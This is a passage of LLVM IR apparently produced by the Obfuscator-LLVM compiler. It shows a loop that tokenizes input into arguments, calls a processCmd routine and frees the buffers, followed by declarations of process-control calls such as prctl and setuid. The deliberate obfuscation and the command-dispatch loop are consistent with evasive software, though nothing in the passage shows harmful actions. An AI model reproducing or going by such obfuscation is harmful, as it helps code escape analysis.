  store i8 %327, i8* %328, align 1
  %329 = load i8*, i8** %18, align 8
  %330 = getelementptr inbounds i8, i8* %329, i32 1
  store i8* %330, i8** %18, align 8
  br label %318

; <label>:331:                                    ; preds = %318
  store i32 1, i32* %20, align 4
  %332 = load i8*, i8** %15, align 8
  %333 = call i8* @strtok(i8* %332, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.132, i32 0, i32 0)) #5
  store i8* %333, i8** %21, align 8
  %334 = load i8*, i8** %17, align 8
  %335 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %334, i8** %335, align 16
  br label %336

; <label>:336:                                    ; preds = %375, %331
  %337 = load i8*, i8** %21, align 8
  %338 = icmp ne i8* %337, null
  br i1 %338, label %339, label %377

; <label>:339:                                    ; preds = %336
  %340 = load i8*, i8** %21, align 8
  %341 = load i8, i8* %340, align 1
  %342 = zext i8 %341 to i32
  %343 = icmp ne i32 %342, 10
  br i1 %343, label %344, label %375

; <label>:344:                                    ; preds = %339
  %345 = load i8*, i8** %21, align 8
  %346 = call i64 @strlen(i8* %345) #9
  %347 = add i64 %346, -1931089766775033377
  %348 = add i64 %347, 1
  %349 = sub i64 %348, -1931089766775033377
  %350 = add i64 %346, 1
  %351 = call noalias i8* @malloc(i64 %349) #5
  %352 = load i32, i32* %20, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %353
  store i8* %351, i8** %354, align 8
  %355 = load i32, i32* %20, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %356
  %358 = load i8*, i8** %357, align 8
  %359 = load i8*, i8** %21, align 8
  %360 = call i64 @strlen(i8* %359) #9
  %361 = add i64 %360, 7118847255879157277
  %362 = add i64 %361, 1
  %363 = sub i64 %362, 7118847255879157277
  %364 = add i64 %360, 1
  call void @llvm.memset.p0i8.i64(i8* %358, i8 0, i64 %363, i32 1, i1 false)
  %365 = load i32, i32* %20, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %366
  %368 = load i8*, i8** %367, align 8
  %369 = load i8*, i8** %21, align 8
  %370 = call i8* @strcpy(i8* %368, i8* %369) #5
  %371 = load i32, i32* %20, align 4
  %372 = sub i32 0, 1
  %373 = sub i32 %371, %372
  %374 = add nsw i32 %371, 1
  store i32 %373, i32* %20, align 4
  br label %375

; <label>:375:                                    ; preds = %344, %339
  %376 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.132, i32 0, i32 0)) #5
  store i8* %376, i8** %21, align 8
  br label %336

; <label>:377:                                    ; preds = %336
  %378 = load i32, i32* %20, align 4
  %379 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %378, i8** %379)
  %380 = load i32, i32* %20, align 4
  %381 = icmp sgt i32 %380, 1
  br i1 %381, label %382, label %399

; <label>:382:                                    ; preds = %377
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  br label %383

; <label>:383:                                    ; preds = %392, %382
  %384 = load i32, i32* %22, align 4
  %385 = load i32, i32* %20, align 4
  %386 = icmp slt i32 %384, %385
  br i1 %386, label %387, label %398

; <label>:387:                                    ; preds = %383
  %388 = load i32, i32* %22, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %389
  %391 = load i8*, i8** %390, align 8
  call void @free(i8* %391) #5
  br label %392

; <label>:392:                                    ; preds = %387
  %393 = load i32, i32* %22, align 4
  %394 = add i32 %393, -2089451649
  %395 = add i32 %394, 1
  %396 = sub i32 %395, -2089451649
  %397 = add nsw i32 %393, 1
  store i32 %396, i32* %22, align 4
  br label %383

; <label>:398:                                    ; preds = %383
  br label %399

; <label>:399:                                    ; preds = %398, %377
  br label %400

; <label>:400:                                    ; preds = %399, %223
  br label %100

; <label>:401:                                    ; preds = %100
  br label %402

; <label>:402:                                    ; preds = %401, %87
  ret i32 0
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #3

declare i32 @prctl(...) #1

declare i32 @waitpid(i32, i32*, i32) #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare i32 @setuid(i32) #3

; Function Attrs: nounwind
declare i32 @seteuid(i32) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @sleep(i32) #1

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146537462}
!2 = !{i32 -2146536334}
!3 = !{i32 -2146535643}
!4 = !{i32 -2146534894}
